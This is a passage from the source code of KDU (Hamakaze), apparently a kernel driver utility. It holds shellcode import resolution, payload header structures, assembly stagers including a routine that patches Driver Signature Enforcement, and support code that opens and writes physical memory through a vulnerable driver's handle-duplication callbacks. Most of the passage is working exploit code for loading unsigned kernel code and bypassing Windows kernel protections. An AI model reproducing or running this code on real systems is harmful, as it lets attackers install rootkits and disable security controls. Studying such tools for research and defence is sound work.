        ZwClosePtr = ZwCloseTest;
#else
        IoDriverObjectTypePtr =
            (PVOID)ScResolveFunctionByName(KernelBase, KernelImage, "IoDriverObjectType");
        ASSERT_RESOLVED_FUNC_ABORT(IoDriverObjectTypePtr);

        ObCreateObjectPtr =
            (pfnObCreateObject)ScResolveFunctionByName(KernelBase, KernelImage, "ObCreateObject");
        ASSERT_RESOLVED_FUNC_ABORT(ObCreateObjectPtr);

        ObInsertObjectPtr =
            (pfnObInsertObject)ScResolveFunctionByName(KernelBase, KernelImage, "ObInsertObject");
        ASSERT_RESOLVED_FUNC_ABORT(ObInsertObjectPtr);

        ObMakeTemporaryObjectPtr =
            (pfnObMakeTemporaryObject)ScResolveFunctionByName(KernelBase, KernelImage, "ObMakeTemporaryObject");
        ASSERT_RESOLVED_FUNC_ABORT(ObMakeTemporaryObjectPtr);

        ZwMakeTemporaryObjectPtr =
            (pfnZwMakeTemporaryObject)ScResolveFunctionByName(KernelBase, KernelImage, "ZwMakeTemporaryObject");
        ASSERT_RESOLVED_FUNC_ABORT(ZwMakeTemporaryObjectPtr);

        ZwClosePtr =
            (pfnZwClose)ScResolveFunctionByName(KernelBase, KernelImage, "ZwClose");
        ASSERT_RESOLVED_FUNC_ABORT(ZwClosePtr);
#endif

        pvPayloadHead.Version.v3->IoDriverObjectType = IoDriverObjectTypePtr;
        pvPayloadHead.Version.v3->ObCreateObject = ObCreateObjectPtr;
        pvPayloadHead.Version.v3->ObInsertObject = ObInsertObjectPtr;
        pvPayloadHead.Version.v3->ObMakeTemporaryObject = ObMakeTemporaryObjectPtr;
        pvPayloadHead.Version.v3->ZwMakeTemporaryObject = ZwMakeTemporaryObjectPtr;
        pvPayloadHead.Version.v3->ZwClose = ZwClosePtr;

        break;

    case KDU_SHELLCODE_V2:

#ifdef _DEBUG
        ExQueueWorkItemPtr = ExQueueWorkItemTest;
#else
        ExQueueWorkItemPtr =
            (pfnExQueueWorkItem)ScResolveFunctionByName(KernelBase, KernelImage, "ExQueueWorkItem");
        ASSERT_RESOLVED_FUNC_ABORT(ExQueueWorkItemPtr);
#endif
        pvPayloadHead.Version.v2->ExQueueWorkItem = ExQueueWorkItemPtr;

        break;

    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V1:
    default:

#ifdef _DEBUG
        ZwClosePtr = ZwCloseTest;
        PsCreateSystemThreadPtr = PsCreateSystemThreadTest;
#else
        ZwClosePtr =
            (pfnZwClose)ScResolveFunctionByName(KernelBase, KernelImage, "ZwClose");
        ASSERT_RESOLVED_FUNC_ABORT(ZwClosePtr);

        PsCreateSystemThreadPtr =
            (pfnPsCreateSystemThread)ScResolveFunctionByName(KernelBase, KernelImage, "PsCreateSystemThread");
        ASSERT_RESOLVED_FUNC_ABORT(PsCreateSystemThreadPtr);
#endif

        pvPayloadHead.Version.v1->PsCreateSystemThread = PsCreateSystemThreadPtr;
        pvPayloadHead.Version.v1->ZwClose = ZwClosePtr;
        break;
    }

    return TRUE;
}

```

`Source/Hamakaze/shellcode.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       SHELLCODE.H
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Default driver mapping shellcode(s) prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

typedef struct _PAYLOAD_HEADER_V1 {
    ULONG ImageSize;
    IO_STATUS_BLOCK IoStatus;

    //
    // Variant specific fields.
    // 
    pfnPsCreateSystemThread PsCreateSystemThread;
    pfnZwClose ZwClose;

    //BYTE Payload[ANYSIZE_ARRAY]; //following header, not a part of this structure
} PAYLOAD_HEADER_V1, * PPAYLOAD_HEADER_V1;

typedef struct _PAYLOAD_HEADER_V2 {
    ULONG ImageSize;
    IO_STATUS_BLOCK IoStatus;

    //
    // Variant specific fields.
    //
    pfnExQueueWorkItem ExQueueWorkItem;

    //BYTE Payload[ANYSIZE_ARRAY]; //following header, not a part of this structure
} PAYLOAD_HEADER_V2, * PPAYLOAD_HEADER_V2;

typedef struct _PAYLOAD_HEADER_V3 {
    ULONG ImageSize;
    IO_STATUS_BLOCK IoStatus;

    //
    // Variant specific fields.
    //
    PVOID IoDriverObjectType;
    pfnObCreateObject ObCreateObject;
    pfnObInsertObject ObInsertObject;
    pfnObMakeTemporaryObject ObMakeTemporaryObject;
    pfnZwMakeTemporaryObject ZwMakeTemporaryObject;
    pfnZwClose ZwClose;

    FIXED_UNICODE_STRING ObjectName;
    FIXED_UNICODE_STRING RegistryPath;

    //BYTE Payload[ANYSIZE_ARRAY]; //following header, not a part of this structure
} PAYLOAD_HEADER_V3, * PPAYLOAD_HEADER_V3;

SIZE_T ScGetViewSize(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer);

DWORD ScSizeOf(
    _In_ ULONG ScVersion,
    _Out_opt_ PULONG PayloadSize);

ULONG ScSizeOfProc(
    _In_ PBYTE FunctionPtr);

BOOLEAN ScCreateFixedUnicodeString(
    _Inout_ PFIXED_UNICODE_STRING DestinationString,
    _In_ PCWSTR SourceString);

HANDLE ScCreateReadyEvent(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer);

BOOLEAN ScStoreVersionSpecificData(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID PayloadPtr);

ULONG_PTR ScResolveFunctionByName(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR Function);

BOOLEAN ScResolveImportForPayload(
    _In_ ULONG ShellVersion,
    _In_ PVOID PayloadHead,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase);

PVOID ScGetBootstrapLdr(
    _In_ ULONG ShellVersion,
    _Out_opt_ PULONG Size);

VOID ScFree(
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize);

PVOID ScAllocate(
    _In_ ULONG ShellVersion,
    _In_ HANDLE SectionHandle,
    _In_ SIZE_T SectionViewSize,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG MemoryTag,
    _Out_ PULONG ShellSize);

```

`Source/Hamakaze/shellmasm.asm`:

```asm
;*******************************************************************************
;
;  (C) COPYRIGHT AUTHORS, 2022
;
;  TITLE:       SHELLMASM.ASM
;
;  VERSION:     1.28
;
;  DATE:        01 Dec 2022
;
;  Masm shellcode implementation for KDU.
;
; THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
; ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
; TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
; PARTICULAR PURPOSE.
;
;*******************************************************************************/
_TEXT$00 segment para 'CODE'

    ALIGN 16
    PUBLIC ZmShellStager
    PUBLIC ZmShellStagerEnd
    PUBLIC ZmShellDSEFix
    PUBLIC ZmShellDSEFixEnd
    PUBLIC BaseShellDSEFix
    PUBLIC BaseShellDSEFixEnd

ZmShellStager PROC
    pop rax
    push rdi
    push rsi
    mov rax, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rax, rdx
    mov rdi, rax
    mov rsi, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rsi, rdx
    xor rcx, rcx
    inc cl
    shl ecx, 0ch
    rep movsb
    pop rsi
    pop rdi
    ret
ZmShellStager ENDP

ZmShellStagerEnd PROC
    ret
ZmShellStagerEnd ENDP

ZmShellDSEFix PROC
    pop rax
    mov rax, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rax, rdx
    mov rcx, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rcx, rdx
    mov qword ptr[rax], rcx
    ret
ZmShellDSEFix ENDP

ZmShellDSEFixEnd PROC
    ret
ZmShellDSEFixEnd ENDP

BaseShellDSEFix PROC
    mov rax, 01122334455667788h ;Address
    mov rcx, 08877665544332211h ;Value
    mov qword ptr[rax], rcx
    ret
BaseShellDSEFix ENDP

BaseShellDSEFixEnd PROC
    ret
BaseShellDSEFixEnd ENDP

_TEXT$00 ENDS
	
END

```

`Source/Hamakaze/sig.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       SIG.H
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Signatures definition header file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

//
// Process Explorer dispatch signature.
//

static unsigned char g_ProcExpSig[] = {
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x81, 0xEC, 0x90, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0xFA, 0x33, 0xDB, 0x48, 0x8B, 0xD1, 0x48,
    0x8B, 0x8F, 0xB8, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x47, 0x18, 0x48,
    0x89, 0x5F, 0x38, 0x0F, 0xB6, 0x01, 0x44, 0x8B, 0x49, 0x08, 0x44,
    0x8B, 0x51, 0x18, 0x84, 0xC0, 0x74, 0x3E, 0x3C, 0x0E, 0x74, 0x0A,
    0xBB, 0x10, 0x00, 0x00, 0xC0
};

```

`Source/Hamakaze/sup.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       SUP.CPP
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  Program global support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Memory);
}

/*
* supAllocateLockedMemory
*
* Purpose:
*
* Wrapper for VirtualAllocEx+VirtualLock.
*
*/
PVOID supAllocateLockedMemory(
    _In_ SIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
)
{
    PVOID Buffer;
    DWORD lastError;

    SetLastError(ERROR_SUCCESS);

    Buffer = VirtualAllocEx(NtCurrentProcess(),
        NULL,
        Size,
        AllocationType,
        Protect);

    if (Buffer) {

        if (!VirtualLock(Buffer, Size)) {

            lastError = GetLastError();

            VirtualFreeEx(NtCurrentProcess(),
                Buffer,
                0,
                MEM_RELEASE);

            SetLastError(lastError);

            Buffer = NULL;
        }

    }

    return Buffer;
}

/*
* supFreeLockedMemory
*
* Purpose:
*
* Wrapper for VirtualUnlock + VirtualFreeEx.
*
*/
BOOL supFreeLockedMemory(
    _In_ PVOID Memory,
    _In_ SIZE_T LockedSize
)
{
    BOOL bUnlocked, bFreed;
    DWORD e = ERROR_SUCCESS;

    if (Memory == NULL)
        return FALSE;

    bUnlocked = VirtualUnlock(Memory, LockedSize);
    if (!bUnlocked)
        e = GetLastError();

    bFreed = VirtualFreeEx(NtCurrentProcess(), Memory, 0, MEM_RELEASE);
    if (!bFreed && e == ERROR_SUCCESS)
        e = GetLastError();

    SetLastError(e);
    return (bUnlocked && bFreed);
}

/*
* supCallDriverEx
*
* Purpose:
*
* Call driver.
*
*/
NTSTATUS supCallDriverEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus)
{
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    if (ntStatus == STATUS_PENDING) {

        ntStatus = NtWaitForSingleObject(DeviceHandle,
            FALSE,
            NULL);

        if (NT_SUCCESS(ntStatus))
            ntStatus = ioStatus.Status;

    }

    if (IoStatus)
        *IoStatus = ioStatus;

    return ntStatus;
}

/*
* supCallDriver
*
* Purpose:
*
* Call driver.
*
*/
BOOL supCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = supCallDriverEx(
        DeviceHandle,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        &ioStatus);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* supMapPhysicalMemory
*
* Purpose:
*
* Map physical memory.
*
*/
PVOID supMapPhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL MapForWrite
)
{
    PVOID viewBase = NULL;
    ULONG ulProtect;
    LARGE_INTEGER sectionBase;
    SIZE_T viewSize;

    if (MapForWrite)
        ulProtect = PAGE_READWRITE;
    else
        ulProtect = PAGE_READONLY;

    ULONG_PTR offset = PhysicalAddress & ~(PAGE_SIZE - 1);

    sectionBase.QuadPart = offset;
    viewSize = (PhysicalAddress - offset) + NumberOfBytes;

    NTSTATUS ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &viewBase,
        0,
        0,
        &sectionBase,
        &viewSize,
        ViewUnmap,
        NULL,
        ulProtect);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
    }
    else {
        return viewBase;
    }

    return NULL;
}

/*
* supUnmapPhysicalMemory
*
* Purpose:
*
* Unmap physical memory view.
*
*/
VOID supUnmapPhysicalMemory(
    _In_ PVOID BaseAddress
)
{
    NtUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
}

/*
* supReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI supReadWritePhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    ULONG_PTR offset;

    mappedSection = supMapPhysicalMemory(SectionHandle,
        PhysicalAddress,
        NumberOfBytes,
        DoWrite);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        supUnmapPhysicalMemory(mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* supOpenPhysicalMemory2
*
* Purpose:
*
* Locate and open physical memory section for read/write.
*
*/
BOOL WINAPI supOpenPhysicalMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_NOT_FOUND;
    ULONG sectionObjectType = (ULONG)-1;
    HANDLE sectionHandle = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usSection;

    do {

        *PhysicalMemoryHandle = NULL;

        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS ntStatus = NtOpenSection(&sectionHandle, SECTION_QUERY, &obja);

        if (!NT_SUCCESS(ntStatus)) {
            dwError = RtlNtStatusToDosError(ntStatus);
            break;
        }

        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (handleArray == NULL) {
            dwError = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        ULONG i;
        DWORD currentProcessId = GetCurrentProcessId();

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
            {
                sectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
                break;
            }
        }

        NtClose(sectionHandle);
        sectionHandle = NULL;

        if (sectionObjectType == (ULONG)-1) {
            dwError = ERROR_INVALID_DATATYPE;
            break;
        }

        RtlInitUnicodeString(&usSection, L"\\Device\\PhysicalMemory");

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)sectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
            {
                HANDLE testHandle = NULL;

                if (DuplicateHandleCallback(DeviceHandle,
                    UlongToHandle(SYSTEM_PID_MAGIC),
                    NULL,
                    (HANDLE)handleArray->Handles[i].HandleValue,
                    &testHandle,
                    MAXIMUM_ALLOWED,
                    0,
                    0))
                {
                    union {
                        BYTE* Buffer;
                        POBJECT_NAME_INFORMATION Information;
                    } NameInfo;

                    NameInfo.Buffer = NULL;

                    ntStatus = supQueryObjectInformation(testHandle,
                        ObjectNameInformation,
                        (PVOID*)&NameInfo.Buffer,
                        NULL,
                        (PNTSUPMEMALLOC)supHeapAlloc,
                        (PNTSUPMEMFREE)supHeapFree);

                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {

                        if (RtlEqualUnicodeString(&usSection, &NameInfo.Information->Name, TRUE)) {
                            *PhysicalMemoryHandle = testHandle;
                            bResult = TRUE;
                        }

                        supHeapFree(NameInfo.Buffer);
                    }

                    if (bResult == FALSE)
                        NtClose(testHandle);
                }

                if (bResult)
                    break;

            }
        }

    } while (FALSE);

    if (sectionHandle) NtClose(sectionHandle);
    if (handleArray) supHeapFree(handleArray);

    if (bResult) dwError = ERROR_SUCCESS;

    SetLastError(dwError);
    return bResult;
}

/*
* supOpenPhysicalMemory
*
* Purpose:
*
* Locate and open physical memory section for read/write.
*
*/
BOOL WINAPI supOpenPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ pfnOpenProcessCallback OpenProcessCallback,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_NOT_FOUND;
    ULONG sectionObjectType = (ULONG)-1;
    HANDLE processHandle = NULL;
    HANDLE sectionHandle = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usSection;

    do {

        *PhysicalMemoryHandle = NULL;

        if (!OpenProcessCallback(DeviceHandle,
            UlongToHandle(SYSTEM_PID_MAGIC),
            PROCESS_ALL_ACCESS,
            &processHandle))
        {
            dwError = GetLastError();
            break;
        }

        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS ntStatus = NtOpenSection(&sectionHandle, SECTION_QUERY, &obja);

        if (!NT_SUCCESS(ntStatus)) {
            dwError = RtlNtStatusToDosError(ntStatus);
            break;
        }

        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (handleArray == NULL) {
            dwError = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        ULONG i;
        DWORD currentProcessId = GetCurrentProcessId();

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
            {
                sectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
                break;
            }
        }

        NtClose(sectionHandle);
        sectionHandle = NULL;

        if (sectionObjectType == (ULONG)-1) {
            dwError = ERROR_INVALID_DATATYPE;
            break;
        }

        RtlInitUnicodeString(&usSection, L"\\Device\\PhysicalMemory");

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)sectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
            {
                HANDLE testHandle = NULL;

                if (DuplicateHandleCallback(DeviceHandle,
                    UlongToHandle(SYSTEM_PID_MAGIC),
                    processHandle,
                    (HANDLE)handleArray->Handles[i].HandleValue,
                    &testHandle,
                    MAXIMUM_ALLOWED,
                    0,
                    0))
                {
                    union {
                        BYTE* Buffer;
                        POBJECT_NAME_INFORMATION Information;
                    } NameInfo;

                    NameInfo.Buffer = NULL;

                    ntStatus = supQueryObjectInformation(testHandle,
                        ObjectNameInformation,
                        (PVOID*)&NameInfo.Buffer,
                        NULL,
                        (PNTSUPMEMALLOC)supHeapAlloc,
                        (PNTSUPMEMFREE)supHeapFree);

                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {

                        if (RtlEqualUnicodeString(&usSection, &NameInfo.Information->Name, TRUE)) {
                            *PhysicalMemoryHandle = testHandle;
                            bResult = TRUE;
                        }

                        supHeapFree(NameInfo.Buffer);
                    }

                    if (bResult == FALSE)
                        NtClose(testHandle);
                }

                if (bResult)
                    break;

            }
        }

    } while (FALSE);

    if (sectionHandle) NtClose(sectionHandle);
    if (processHandle) NtClose(processHandle);
    if (handleArray) supHeapFree(handleArray);

    if (bResult) dwError = ERROR_SUCCESS;

    SetLastError(dwError);
    return bResult;
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength,
    _Out_opt_ PULONG HeaderChecksum,
    _Out_opt_ PULONG CalculatedChecksum
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;
    USHORT PartialSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
        PartialSum = 0;
    }

    CheckSum = (ULONG)PartialSum + FileLength;

    if (HeaderChecksum)
        *HeaderChecksum = HeaderSum;
    if (CalculatedChecksum)
        *CalculatedChecksum = CheckSum;

    return (CheckSum == HeaderSum);
}

typedef struct _REGSTACK_ENTRY {
    WCHAR SubKey[MAX_PATH + 1];
} REGSTACK_ENTRY, * PREGSTACK_ENTRY;

/*
* supxDeleteKeyTreeWorker
*
* Purpose:
*
* Delete key and it subkeys/values.
*
*/
BOOL supxDeleteKeyTreeWorker(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey
)
{
    HKEY hKey;
    LONG lResult;
    DWORD dwSize;
    FILETIME ftWrite;
    WCHAR szName[MAX_PATH + 1];
    WCHAR workingPath[MAX_PATH * 2];
    USHORT depthStack[256]; // depth (path length in WCHARs, excluding terminator)
    INT sp = -1;
    SIZE_T baseLen, curLen;
    SIZE_T nameLen;
    BOOL hasTrailingSlash;
    PWCHAR p;

    if (lpSubKey == NULL || lpSubKey[0] == 0)
        return FALSE;

    RtlSecureZeroMemory(depthStack, sizeof(depthStack));
    _strncpy(workingPath, RTL_NUMBER_OF(workingPath), lpSubKey, RTL_NUMBER_OF(workingPath) - 1);

    //
    // Try fast delete first.
    //
    lResult = RegDeleteKey(hKeyRoot, workingPath);
    if (lResult == ERROR_SUCCESS || lResult == ERROR_FILE_NOT_FOUND)
        return TRUE;

    lResult = RegOpenKeyEx(hKeyRoot, workingPath, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        return FALSE;
    }
    RegCloseKey(hKey);

    //
    // Normalize base path: remove trailing backslashes (keep root form if any).
    //
    baseLen = _strlen(workingPath);
    while (baseLen > 0 && workingPath[baseLen - 1] == L'\\') {
        workingPath[baseLen - 1] = 0;
        baseLen--;
    }
    if (baseLen == 0)
        return FALSE;

    ++sp;
    depthStack[sp] = (USHORT)baseLen;

    while (sp >= 0) {

        curLen = depthStack[sp];
        workingPath[curLen] = 0;

        lResult = RegOpenKeyEx(hKeyRoot, workingPath, 0, KEY_READ, &hKey);
        if (lResult != ERROR_SUCCESS) {
            if (lResult == ERROR_FILE_NOT_FOUND) {
                sp--;
                continue;
            }
            return FALSE;
        }

        dwSize = MAX_PATH;
        lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL, NULL, NULL, &ftWrite);

        if (lResult == ERROR_NO_MORE_ITEMS) {

            RegCloseKey(hKey);
            RegDeleteKey(hKeyRoot, workingPath);
            sp--;
            continue;
        }

        if (lResult != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return FALSE;
        }

        RegCloseKey(hKey);

        //
        // Append child: workingPath + '\' + child + '\'.
        //
        nameLen = dwSize;
        hasTrailingSlash = (curLen > 0 && workingPath[curLen - 1] == L'\\');

        //
        // Ensure capacity: base + optional '\' + name + optional '\' + 0.
        //
        if (curLen + (hasTrailingSlash ? 0 : 1) + nameLen + 1 + 1 >= RTL_NUMBER_OF(workingPath))
            return FALSE;

        p = workingPath + curLen;
        if (!hasTrailingSlash) {
            *p++ = L'\\';
            curLen++;
        }

        _strncpy(p, RTL_NUMBER_OF(workingPath) - curLen, szName, nameLen);
        p[nameLen] = 0;
        curLen += nameLen;

        //
        // Add trailing backslash to simplify appending next level.
        //
        p = workingPath + curLen;
        *p++ = L'\\';
        *p = 0;
        curLen++;

        if (++sp >= (INT)RTL_NUMBER_OF(depthStack))
            return FALSE;

        depthStack[sp] = (USHORT)curLen;
    }

    return TRUE;
}

/*
* supRegDeleteKeyTree
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supRegDeleteKeyTree(
    _In_ HKEY hKeyRoot,
    _In_ LPCWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];

    if (lpSubKey == NULL)
        return FALSE;

    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, RTL_NUMBER_OF(szKeyName), lpSubKey, RTL_NUMBER_OF(szKeyName) - 1);

    return supxDeleteKeyTreeWorker(hKeyRoot, szKeyName);
}

/*
* supRegWriteValueDWORD
*
* Purpose:
